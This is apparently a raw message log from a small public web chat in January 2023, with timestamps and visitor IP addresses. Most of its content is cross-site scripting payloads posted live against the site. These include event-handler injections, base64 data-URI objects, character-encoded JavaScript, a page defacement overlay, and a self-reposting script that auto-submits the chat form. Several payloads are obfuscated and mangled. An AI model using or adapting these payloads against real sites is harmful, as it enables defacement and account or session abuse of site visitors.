;XD32;XD92;XD110;XD47;XD42;XD32;XD116;XD117;XD114;XD116;XD108;XD44;XD32;XD89;XD111;XD117;XD32;XD99;XD97;XD110;XD32;XD101;XD100;XD105;XD116;XD32;XD116;XD104;XD101;XD109;XD101;XD32;XD108;XD105;XD118;XD101;XD32;XD58;XD41;XD32;XD42;XD47;XD32;XD92;XD110;XD32;XD99;XD111;XD108;XD111;XD114;XD58;XD32;XD100;XD97;XD114;XD107;XD103;XD114;XD101;XD101;XD110;XD59;XD32;XD92;XD110;XD125;XD60;XD47;XD115;XD116;XD121;XD108;XD101;XD62;XD39;)"></t1tl3><t1tl3 t1tl3=""><x_x>
+<br><br></x_x></t1tl3></d;v>
+[2023/01/28 19:22:28][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> this looks like a $cript injection<br></d;v>
+[2023/01/28 19:22:17][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> what<br></d;v>
+[2023/01/28 19:22:03][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/mqdefault.jpg"><br></d;v>
+[2023/01/28 19:21:12][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> 
+<br><t1tl3 0npr0pertychange="j@va$cript:@lert(1)"></t1tl3><t1tl3 t1tl3=""><x_x>
+<br><br></x_x></t1tl3></d;v>
+[2023/01/28 19:20:05][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> <img src="" 0n3rr0r="" "="" '"="alt=j@va$cript:@lert(1)//&quot;"><x_x><br></x_x></d;v>
+[2023/01/28 19:19:28][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/$cript%20.html" `=""><x_x><br></x_x></d;v>
+[2023/01/28 19:18:40][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> it's nice<img src="Welcome%20To%20My%20Web%20Site%20)_files/x130n3rr0r=%20j@va$cript%20@lert(1)%20.html"><x_x><br></x_x></d;v>
+[2023/01/28 18:51:42][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> yummy<br></d;v>
+[2023/01/28 18:48:20][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/jZWlGQP0BBM.html" width="600" height="400"></iframe></d;v></x3ta></p><h1 style="color:red">How to make Sharoy Fried Chicken™</h1><x_x><br></x_x></bod¥></f0rm></d;v>
+[2023/01/28 18:46:35][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> <iframe src="https://www.youtube.com/watch?v=jZWlGQP0BBM" width="600" height="400"></iframe><x_x><br></x_x></d;v>
+[2023/01/28 18:44:53][<a href="http://60.242.253.123/global//185.141.196.229">/185.141.196.229</a>]<d;v> <iframe src="Welcome%20To%20My%20Web%20Site%20)_files/a_004.html" width="300" height="200"></iframe><x_x><br></x_x></d;v>
+[2023/01/28 17:25:31][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <d;v style="color:red"><h3>HTML Hackers Lurk Here! Beware!</h3></d;v><br></d;v>
+[2023/01/28 17:19:59][185.141.196.229]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="XD106;XD97;XD118;XD97;XD115;XD99;XD114;XD105;XD112;XD116;XD58;XD100;XD111;XD99;XD117;XD109;XD101;XD110;XD116;XD46;XD103;XD101;XD116;XD69;XD108;XD101;XD109;XD101;XD110;XD116;XD115;XD66;XD121;XD84;XD97;XD103;XD78;XD97;XD109;XD101;XD40;XD34;XD104;XD49;XD34;XD41;XD91;XD48;XD93;XD46;XD105;XD110;XD110;XD101;XD114;XD72;XD84;XD77;XD76;XD32;XD61;XD32;XD39;XD60;XD100;XD105;XD118;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD112;XD111;XD115;XD116;XD105;XD116;XD105;XD111;XD110;XD58;XD32;XD97;XD98;XD115;XD111;XD108;XD117;XD116;XD101;XD59;XD122;XD45;XD105;XD110;XD100;XD101;XD120;XD58;XD32;XD57;XD59;XD98;XD97;XD99;XD107;XD103;XD114;XD111;XD117;XD110;XD100;XD58;XD32;XD119;XD104;XD105;XD116;XD101;XD59;XD119;XD105;XD100;XD116;XD104;XD58;XD32;XD53;XD48;XD48;XD112;XD120;XD59;XD104;XD101;XD105;XD103;XD104;XD116;XD58;XD32;XD53;XD48;XD48;XD112;XD120;XD34;XD62;XD60;XD112;XD32;XD115;XD116;XD121;XD108;XD101;XD61;XD34;XD99;XD111;XD108;XD111;XD114;XD58;XD114;XD101;XD100;XD34;XD62;XD76;XD111;XD118;XD101;XD32;XD121;XD111;XD117;XD32;XD115;XD108;XD101;XD110;XD100;XD105;XD60;XD47;XD112;XD62;XD60;XD105;XD109;XD103;XD32;XD115;XD114;XD99;XD61;XD34;XD104;XD116;XD116;XD112;XD115;XD58;XD47;XD47;XD105;XD46;XD105;XD109;XD103;XD102;XD108;XD105;XD112;XD46;XD99;XD111;XD109;XD47;XD54;XD114;XD98;XD99;XD120;XD103;XD46;XD112;XD110;XD103;XD34;XD32;XD119;XD105;XD100;XD116;XD104;XD61;XD34;XD49;XD48;XD48;XD112;XD120;XD34;XD32;XD104;XD101;XD105;XD103;XD104;XD116;XD61;XD34;XD49;XD48;XD48;XD112;XD120;XD34;XD62;XD60;XD47;XD100;XD105;XD118;XD62;XD39;">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 17:19:15][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> nice one<br></d;v>
+[2023/01/28 17:17:56][185.141.196.229]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/x.html" 0n3rr0r="XD0000106XD0000097XD0000118XD0000097XD0000115XD0000099XD0000114XD0000105XD0000112XD0000116XD0000058XD0000097XD0000108XD0000101XD0000114XD0000116XD0000040XD0000039XD0000088XD0000083XD0000083XD0000039XD0000041">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 17:16:05][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> ok chat limit is now over 9000<br></d;v>
+[2023/01/28 17:15:07][185.141.196.229]<d;v> nice<br></d;v>
+
+[2023/01/28 17:11:42][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> and we're back!<br></d;v>
+[2023/01/28 16:49:16][185.141.196.229]<d;v> 
+<br>someone hacked site
+<br><style>
+<br>li { 
+<br>  background: 
+<br>    url(d@ta:image/png;b64,PHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaDEiKVswXS5pbm5lckhUTUwgPSAnPGRpdiBzdHlsZT0icG9zdGl0aW9uOiBhYnNvbHV0ZTt6LWluZGV4OiA5O2JhY2tncm91bmQ6IHdoaXRlO3dpZHRoOiA1MDBweDtoZWlnaHQ6IDUwMHB4Ij48cCBzdHlsZT0iY29sb3I6cmVkIj5Mb3ZlIHlvdSBzbGVuZGk8L3A+PGltZyBzcmM9Imh0dHBzOi8vaS5pbWdmbGlwLmNvbS82cmJjeGcucG5nIiB3aWR0aD0iMTAwcHgiIGhlaWdodD0iMTAwcHgiPjwvZGl2Pic7PC9zY3JpcHQ+) 
+<br>    no-repeat 
+<br>    left center;
+<br>  padding: 5px 0 5px 25px;
+<br>}
+<br></style>
+<br><x_x><br></x_x></d;v>
+[2023/01/28 16:48:17][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> :P<br></d;v>
+[2023/01/28 16:45:40][185.141.196.229]<d;v> 
+<br><br size="&amp;{d0cument.getElementsByTagName(" h1")[0].innerhtml="&lt;d;v style=&quot;postition: @bsolute;z-index: 9;background: white;width: 500px;height: 500px&quot;&gt;&lt;p style=&quot;color:red&quot;&gt;Love you slendi&lt;/p&gt;&lt;img src=&quot;https://i.imgflip.com/6rbcxg.png&quot; width=&quot;100px&quot; height=&quot;100px&quot;&gt;&lt;/d;v&gt;" }"="">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 16:42:47][185.141.196.229]<d;v> 
+<br>noo
+<br><br size="&amp;{d0cument.getElementById('time').innerHTML = '&lt;d;v style=" postition:="" @bsolute;z-index:="" 9;background:="" white;width:="" 500px;height:="" 500px"=""><p style="color:red">Love you slendi</p><img src="Welcome%20To%20My%20Web%20Site%20)_files/6rbcxg.png" width="100px" height="100px"></d;v>'}"&gt;
+<br><x_x><br>
+[2023/01/28 16:41:34][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> helo<br></d;v>
+[2023/01/28 16:41:17][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> at around [2023/01/28 15:02:21][77.243.25.8] &lt;$vg/0nl0ad=@lert('X_x')&gt; the thing skips 
+<br><br></d;v>
+[2023/01/28 16:40:53][185.141.196.229]<d;v> </d;v></x_x>
+<br>hi
+<br><br size="&amp;{XD0061lert('X_x')}">
+<br><x_x><br>
+[2023/01/28 16:40:48][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> can u help me figure out why not 100% of the chat is showing<br></d;v>
+[2023/01/28 16:40:35][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> til nex time<br></d;v>
+[2023/01/28 16:40:20][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> trole<br></d;v>
+[2023/01/28 16:40:18][185.141.196.229]<d;v> </d;v></x_x>
+<br>sad
+<br><br size="&amp;{@lert('X_x')}">
+<br><x_x><br>
+[2023/01/28 16:39:38][185.141.196.229]<d;v> </d;v></x_x>
+<br>you win
+<br><bod¥ 0nl0ad="@lert('X_x')">
+<br><x_x><br>
+[2023/01/28 16:38:51][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> dead chat bc chat keeps breaking
+<br><br></d;v>
+[2023/01/28 16:37:45][185.141.196.229]<d;v> </d;v></x_x>
+<br>dead chat xd
+<br>&lt;0bject 
+d@ta="dXD0061tXD0061:text/html;bXD0061se64,PHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZScpLmlubmVySFRNTCA9ICc8ZGl2IHN0eWxlPSJwb3N0aXRpb246IGFic29sdXRlO3otaW5kZXg6IDk7YmFja2dyb3VuZDogd2hpdGU7d2lkdGg6IDUwMHB4O2hlaWdodDogNTAwcHgiPjxwIHN0eWxlPSJjb2xvcjpyZWQiPkxvdmUgeW91IHNsZW5kaTwvcD48aW1nIHNyYz0iaHR0cHM6Ly9pLmltZ2ZsaXAuY29tLzZyYmN4Zy5wbmciIHdpZHRoPSIxMDBweCIgaGVpZ2h0PSIxMDBweCI+PC9kaXY+Jzs8L3NjcmlwdD4="&gt;
+<br><x_x><br>
+[2023/01/28 16:37:06][185.141.196.229]<d;v> </d;v></x_x>
+<br>hello
+<br>&lt;0bject 
+dXD0061tXD0061="dXD0061tXD0061:text/html;bXD0061se64,PHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZScpLmlubmVySFRNTCA9ICc8ZGl2IHN0eWxlPSJwb3N0aXRpb246IGFic29sdXRlO3otaW5kZXg6IDk7YmFja2dyb3VuZDogd2hpdGU7d2lkdGg6IDUwMHB4O2hlaWdodDogNTAwcHgiPjxwIHN0eWxlPSJjb2xvcjpyZWQiPkxvdmUgeW91IHNsZW5kaTwvcD48aW1nIHNyYz0iaHR0cHM6Ly9pLmltZ2ZsaXAuY29tLzZyYmN4Zy5wbmciIHdpZHRoPSIxMDBweCIgaGVpZ2h0PSIxMDBweCI+PC9kaXY+Jzs8L3NjcmlwdD4="&gt;
+<br><x_x><br>
+[2023/01/28 16:29:50][185.141.196.229]<d;v> </d;v></x_x>
+<br>hello
+<br>&lt;0bject 
+d@ta="d@ta:text/html;b64,PHNjcmlwdD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZScpLmlubmVySFRNTCA9ICc8ZGl2IHN0eWxlPSJwb3N0aXRpb246IGFic29sdXRlO3otaW5kZXg6IDk7YmFja2dyb3VuZDogd2hpdGU7d2lkdGg6IDUwMHB4O2hlaWdodDogNTAwcHgiPjxwIHN0eWxlPSJjb2xvcjpyZWQiPkxvdmUgeW91IHNsZW5kaTwvcD48aW1nIHNyYz0iaHR0cHM6Ly9pLmltZ2ZsaXAuY29tLzZyYmN4Zy5wbmciIHdpZHRoPSIxMDBweCIgaGVpZ2h0PSIxMDBweCI+PC9kaXY+Jzs8L3NjcmlwdD4="&gt;
+<br><x_x><br>
+[2023/01/28 16:28:27][185.141.196.229]<d;v> </d;v></x_x>
+<br>hi
+<br>&lt;0bject d@ta="d@ta:text/html;b64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg=="&gt;
+<br><x_x><br>
+[2023/01/28 16:23:51][185.141.196.229]<d;v> </d;v></x_x> 
+<br>XD34;XD62;<h1 onmouseover="@lert(1)">%00
+<br><x_x></x_x></h1><br>
+[2023/01/28 16:23:26][185.141.196.229]<d;v>  
+<br>XD34;XD62;<h1 onmouseover="XD0061lert(1)">%00
+<br><x_x></x_x></h1><br></d;v>
+[2023/01/28 16:22:36][185.141.196.229]<d;v>  
+<br>XD34;XD62;<h1 onmouseover="dXD006Fcument.getElementById(" time').innerhtml="&lt;d;v style=&quot;postition: XD0061bsolute;z-index: 9;background: white;width: 500px;height: 500px&quot;&gt;&lt;p style=&quot;color:red&quot;&gt;Love you slendi&lt;/p&gt;&lt;img src=&quot;https://i.imgflip.com/6rbcxg.png&quot; width=&quot;100px&quot; height=&quot;100px&quot;&gt;&lt;/d;v&gt;" '="">%00
+<br><x_x></x_x></h1><br></d;v>
+[2023/01/28 16:21:35][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> &lt;.." <br></d;v>
+[2023/01/28 16:21:23][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> "<br></d;v>
+[2023/01/28 16:19:30][185.141.196.229]<d;v>  
+<br>XD34;XD62;<h1 onmouseover="d0cument.getElementById(" time').innerhtml="&lt;d;v style=&quot;postition: @bsolute;z-index: 9;background: white;width: 500px;height: 500px&quot;&gt;&lt;p style=&quot;color:red&quot;&gt;Love you slendi&lt;/p&gt;&lt;img src=&quot;https://i.imgflip.com/6rbcxg.png&quot; width=&quot;100px&quot; height=&quot;100px&quot;&gt;&lt;/d;v&gt;" '="">%00
+<br><x_x></x_x></h1><br></d;v>
+[2023/01/28 16:18:52][185.141.196.229]<d;v> a<br></d;v>
+[2023/01/28 16:14:27][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/Trollface_non-free.png"><br></d;v>
+[2023/01/28 16:13:13][162.247.74.213]<d;v> Hi Nigerias<br></d;v>
+[2023/01/28 16:09:50][185.141.196.229]<d;v>  
+<br><h1 style="color:red">andrew tate tigani</h1>
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/6rbcxg.png">
+<br><x_x><br></x_x></d;v>
+[2023/01/28 16:07:13][185.141.196.229]<d;v>  
+<br>XD34;XD62;<h1 0nl0ad="d0cument.getElementsByClassName('vsc-initialized').innerHTML = '&lt;ol&gt;&lt;li&gt;html d@ta&lt;/li&gt;&lt;/ol&gt;'">%00
+<br><x_x></x_x></h1><br></d;v>
+[2023/01/28 16:02:45][185.141.196.229]<d;v>  
+<br>XD34;XD62;<h1 onmouseover="XD0061lert(1)">%00
+<br>WE CANT BE STOPED FEAR US WIN7
+<br><x_x></x_x></h1><br></d;v>
+[2023/01/28 16:00:22][185.141.196.229]<d;v>  
+<br><s\x00cript\x09type="text j@vas\x00cript"="">j@vas\x00cript:@lert(1);<!--$cript-->
+<br><x_x><br></x_x></s\x00cript\x09type="text></d;v>
+[2023/01/28 15:58:00][185.141.196.229]<d;v>  
+<br><a href="http://60.242.253.123/j@va$cript:d0cument.vulner@bl3=true;//j@vas/x00cript:j@vas/x00cript:@lert(1)" id="fuzzelement1">test</a>
+<br><x_x><br></x_x></d;v>
+[2023/01/28 15:57:24][188.24.238.24]<d;v> Cf Cf<br></d;v>
+[2023/01/28 15:55:45][188.24.238.24]<d;v> https://discord.gg/EfMcMpBm<br></d;v>
+[2023/01/28 15:54:40][84.216.119.49]<d;v> <d;v style="width: 100px; height: 100px; background-color: red"></d;v><br></d;v>
+[2023/01/28 15:53:11][82.183.3.171]<d;v> <butt0n ondblclick="my@lert()">
+<br>    Show @lert Message
+<br></butt0n>
+<br>  
+<br>&lt;$cript&gt;
+<br>    function my@lert() {
+<br>        @lert("Gay");
+<br>    }
+<br><!--$cript--><br></d;v>
+[2023/01/28 15:53:02][185.141.196.229]<d;v> "-pr0mpt(8)-"<br></d;v>
+[2023/01/28 15:52:43][185.141.196.229]<d;v> "-pr0mpt(8)-"
+<br><br></d;v>
+[2023/01/28 15:50:50][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> im getting free pen testing <br></d;v>
+[2023/01/28 15:50:33][185.141.196.229]<d;v> <!--\x3E<img src=xxx:x 0n3rr0r=j@va$cript:@lert(1)> --><br></d;v>
+[2023/01/28 15:49:43][<a href="http://60.242.253.123/global//194.87.6.67">/194.87.6.67</a>]<d;v> What are you trying to do mate 😂<br></d;v>
+[2023/01/28 15:48:54][185.141.196.229]<d;v> 
+123&amp;CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;X_x=&lt;$cript&gt;@lert(1234)<!--$cript--><br></d;v>
+[2023/01/28 15:47:18][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> did u do a pingsweep across australia to find me<br></d;v>
+[2023/01/28 15:47:17][<a href="http://60.242.253.123/global//194.87.6.67">/194.87.6.67</a>]<d;v> https://dn42.dev/ :P
+<br>If anyone is interested I am open to peering in the EU :)<br></d;v>
+[2023/01/28 15:44:40][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> html works here too <br></d;v>
+[2023/01/28 15:44:36][5.14.80.248]<d;v> mooncake<br></d;v>
+[2023/01/28 15:44:26][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> yes<br></d;v>
+[2023/01/28 15:44:00][<a href="http://60.242.253.123/global//194.87.6.67">/194.87.6.67</a>]<d;v> Are the messages only stored in the text file?<br></d;v>
+[2023/01/28 15:43:51][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> (shortcut for inspect element) at the moment i dont have a git repo<br></d;v>
+[2023/01/28 15:43:51][5.14.80.248]<d;v> mooncake<br></d;v>
+[2023/01/28 15:43:48][5.14.80.248]<d;v> mooncake<br></d;v>
+[2023/01/28 15:43:24][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> ctrl shift I<br></d;v>
+[2023/01/28 15:43:02][<a href="http://60.242.253.123/global//194.87.6.67">/194.87.6.67</a>]<d;v> Do you have the source code public for this chat? Maybe a git repo? :)<br></d;v>
+[2023/01/28 15:42:12][5.13.15.125]<d;v> Do not redeem the card<br></d;v>
+[2023/01/28 15:42:11][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> im le admin<br></d;v>
+[2023/01/28 15:40:57][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> hiya<br></d;v>
+[2023/01/28 15:40:45][194.87.6.67]<d;v> Hello from Northrend Networks!<br></d;v>
+[2023/01/28 15:34:14][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:34:10][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:59][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:58][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:56][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:54][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:52][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:50][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:48][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:46][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:45][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:43][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:39][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:37][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
